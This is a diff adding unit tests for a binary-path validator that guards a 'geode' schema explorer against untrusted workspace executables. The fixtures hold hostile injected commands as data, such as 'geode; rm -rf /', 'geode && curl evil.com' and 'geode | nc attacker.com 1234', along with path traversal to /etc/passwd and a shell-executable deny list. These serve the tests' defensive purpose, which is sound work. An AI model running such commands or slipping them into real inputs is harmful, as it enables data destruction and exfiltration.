@@ -532,4 +532,134 @@ describe('Security Tests', () => {
                 'Empty password should not be set or be empty');
         });
     });
+
+    describe('Schema Explorer Binary Path Validation', () => {
+        /**
+         * SECURITY: Issue #29 - SchemaExplorerProvider must validate binary paths
+         * to prevent untrusted workspace binary execution
+         */
+        const isValidBinaryPath = (binaryPath: string): boolean => {
+            // Normalize path separators for consistent checking across platforms
+            const normalizedPath = binaryPath.replace(/\\/g, '/');
+
+            const suspiciousPatterns = [
+                /[;&|`$]/, // Shell metacharacters
+                /\.\.\//, // Path traversal (normalized to forward slash)
+            ];
+
+            // Check for shell metacharacters and path traversal first
+            for (const pattern of suspiciousPatterns) {
+                if (pattern.test(normalizedPath)) {
+                    return false;
+                }
+            }
+
+            // Extract basename from normalized path for cross-platform compatibility
+            const parts = normalizedPath.split('/');
+            const basename = parts[parts.length - 1].toLowerCase();
+
+            // Reject direct shell execution attempts
+            const shellExecutables = ['sh', 'bash', 'zsh', 'cmd', 'cmd.exe', 'powershell', 'powershell.exe'];
+            if (shellExecutables.includes(basename)) {
+                return false;
+            }
+
+            const validNames = ['geode', 'geode.exe', 'geode.sh', 'geode.bat'];
+            if (validNames.includes(basename)) {
+                return true;
+            }
+
+            // Reject non-geode script extensions
+            if (/\.(sh|bat|cmd|ps1)$/i.test(basename)) {
+                return false;
+            }
+
+            return true;
+        };
+
+        it('SECURITY: accepts legitimate geode binary paths', () => {
+            const validPaths = [
+                'geode',
+                '/usr/bin/geode',
+                '/usr/local/bin/geode',
+                'C:\\Program Files\\Geode\\geode.exe',
+                '/home/user/.local/bin/geode'
+            ];
+
+            for (const path of validPaths) {
+                assert.strictEqual(isValidBinaryPath(path), true,
+                    `Should accept valid path: ${path}`);
+            }
+        });
+
+        it('SECURITY: rejects paths with shell metacharacters', () => {
+            const maliciousPaths = [
+                'geode; rm -rf /',
+                'geode && curl evil.com',
+                'geode | nc attacker.com 1234',
+                'geode`whoami`',
+                'geode$EVIL'
+            ];
+
+            for (const path of maliciousPaths) {
+                assert.strictEqual(isValidBinaryPath(path), false,
+                    `Should reject malicious path: ${path}`);
+            }
+        });
+
+        it('SECURITY: rejects path traversal attempts', () => {
+            const traversalPaths = [
+                '../../../bin/sh',
+                '..\\..\\..\\System32\\cmd.exe',
+                '/usr/bin/../../etc/passwd'
+            ];
+
+            for (const path of traversalPaths) {
+                assert.strictEqual(isValidBinaryPath(path), false,
+                    `Should reject path traversal: ${path}`);
+            }
+        });
+
+        it('SECURITY: rejects direct shell execution', () => {
+            const shellPaths = [
+                'sh',
+                'bash',
+                '/bin/bash',
+                'cmd.exe',
+                'powershell.exe'
+            ];
+
+            for (const path of shellPaths) {
+                assert.strictEqual(isValidBinaryPath(path), false,
+                    `Should reject shell execution: ${path}`);
+            }
+        });
+
+        it('SECURITY: rejects non-geode script files', () => {
+            const scriptPaths = [
+                'malicious.sh',
+                'evil.bat',
+                'backdoor.cmd',
+                '/tmp/exploit.ps1'
+            ];
+
+            for (const path of scriptPaths) {
+                assert.strictEqual(isValidBinaryPath(path), false,
+                    `Should reject non-geode script: ${path}`);
+            }
+        });
+
+        it('SECURITY: allows geode wrapper scripts', () => {
+            const wrapperPaths = [
+                '/usr/local/bin/geode.sh',
+                'C:\\tools\\geode.bat',
+                '/opt/geode/geode.sh'
+            ];
+
+            for (const path of wrapperPaths) {
+                assert.strictEqual(isValidBinaryPath(path), true,
+                    `Should allow geode wrapper: ${path}`);
+            }
+        });
+    });
 });
